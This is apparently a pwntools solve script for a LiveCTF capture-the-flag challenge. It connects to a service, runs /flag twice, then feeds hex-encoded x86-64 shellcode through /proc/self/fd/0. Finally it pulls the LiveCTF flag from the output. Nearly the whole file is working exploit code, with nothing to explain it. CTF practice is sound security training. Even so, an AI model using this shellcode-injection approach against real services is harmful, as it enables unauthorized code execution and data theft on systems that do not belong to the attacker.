from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

sc = unhex('488b042431c966b9af264801c8488b384080c70c488d35e5ffffff6681e9af064829cec1e907f3a4c3')

flag = None
for i in range(1):
    r = remote(HOST, int(PORT))

    r.recvuntil(b'Choice: ')

    def run_file(path, extra=None):
        while True:
            r.sendline(b'1')
            r.recvuntil(b'> ')
            r.sendline(path)
            if extra is not None:
                txt = r.recvuntil(b'Choice: ', timeout=0.01)
                if b'opening' in txt:
                    continue
                r.sendline(extra)
            txt = r.recvuntil(b'Choice: ')
            if b'failed' not in txt:
                break

        sleep(0.5)
        r.sendline(b'2')
        txt = r.recvuntil(b'Choice: ')
        return txt.decode() 

    out = run_file(b'/flag')
    out = run_file(b'/flag')
    out = run_file(b'/proc/self/fd/0', sc)
    r.sendline(b'3')

    if 'LiveCTF{' in out:
        flag = out[out.index('LiveCTF'):out.index('}')+1]
        break


log.info('Flag: %s', flag)
